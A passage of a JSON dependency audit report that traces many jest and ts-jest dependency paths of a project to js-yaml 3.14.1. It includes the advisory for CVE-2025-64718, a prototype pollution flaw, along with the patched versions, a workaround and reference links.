            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > @jest/reporters@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > babel-jest@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > babel-jest@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-resolve-dependencies@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > babel-jest@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > babel-jest@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > @jest/reporters@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > babel-jest@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > babel-jest@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-resolve-dependencies@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > @jest/reporters@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > babel-jest@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > babel-jest@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-resolve-dependencies@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > babel-jest@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > babel-jest@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/globals@30.2.0 > @jest/expect@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > jest-snapshot@30.2.0 > @jest/transform@30.2.0 > babel-plugin-istanbul@7.0.1 > @istanbuljs/load-nyc-config@1.1.0 > js-yaml@3.14.1"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64718\n- https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879\n- https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266\n- https://github.com/advisories/GHSA-mh29-5h37-fv8m",
      "created": "2025-11-14T14:29:48.000Z",
      "id": 1109801,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
      "reported_by": null,
      "title": "js-yaml has prototype pollution in merge (<<)",
      "metadata": null,
      "cves": [
        "CVE-2025-64718"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "js-yaml",
      "vulnerable_versions": "<3.14.2",
